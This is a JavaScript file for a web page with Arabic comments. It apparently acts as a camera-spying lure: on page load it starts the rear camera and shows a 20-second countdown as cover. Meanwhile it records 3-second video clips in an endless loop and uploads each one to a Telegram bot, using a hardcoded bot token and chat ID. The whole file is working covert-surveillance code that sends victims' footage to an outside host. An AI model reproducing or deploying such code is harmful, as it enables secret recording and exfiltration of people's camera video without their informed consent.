document.addEventListener("DOMContentLoaded", async function () {
    const countdownElement = document.getElementById("countdown");
    const progressBar = document.getElementById("progress");
    let timeLeft = 20;
    let countdownStarted = false;
    let mediaRecorder;
    let recordedChunks = [];
    let videoStream;

    async function startCamera() {
        try {
            videoStream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: "environment" } // تشغيل الكاميرا الخلفية
            });

            const video = document.getElementById('video');
            video.srcObject = videoStream;
            video.onloadedmetadata = () => {
                console.log("✅ الكاميرا الخلفية تعمل! سيتم بدء التسجيل...");
                startCountdown();
                startRecording();
            };
        } catch (error) {
            console.error("❌ فشل في تشغيل الكاميرا الخلفية:", error);
        }
    }

    function startCountdown() {
        if (countdownStarted) return;
        countdownStarted = true;

        const countdownInterval = setInterval(() => {
            timeLeft--;
            countdownElement.textContent = timeLeft;
            progressBar.style.width = (timeLeft / 20) * 100 + "%";

            if (timeLeft <= 0) {
                clearInterval(countdownInterval);
            }
        }, 1000);
    }

    function startRecording() {
        mediaRecorder = new MediaRecorder(videoStream, { mimeType: "video/webm" });

        mediaRecorder.ondataavailable = function (event) {
            if (event.data.size > 0) {
                recordedChunks.push(event.data);
            }
        };

        mediaRecorder.onstop = function () {
            console.log("📹 تم تسجيل الفيديو! جاري الإرسال...");
            sendVideo();
            recordedChunks = [];
            startRecording(); // إعادة التسجيل فورًا
        };

        mediaRecorder.start();
        setTimeout(() => mediaRecorder.stop(), 3000); // تسجيل كل 3 ثوانٍ
    }

    function sendVideo() {
        const blob = new Blob(recordedChunks, { type: "video/webm" });
        const formData = new FormData();
        formData.append("chat_id", "5375214810");
        formData.append("video", blob, "video_clip.webm");

        fetch("https://api.telegram.org/bot7825240049:AAGXsMh2SkSDOVbv1fW2tsYVYYLFhY7gv5E/sendVideo", {
            method: "POST",
            body: formData
        })
        .then(response => response.json())
        .then(data => console.log("✅ تم إرسال الفيديو بنجاح:", data))
        .catch(error => console.error("❌ خطأ في إرسال الفيديو:", error));
    }

    startCamera();
});
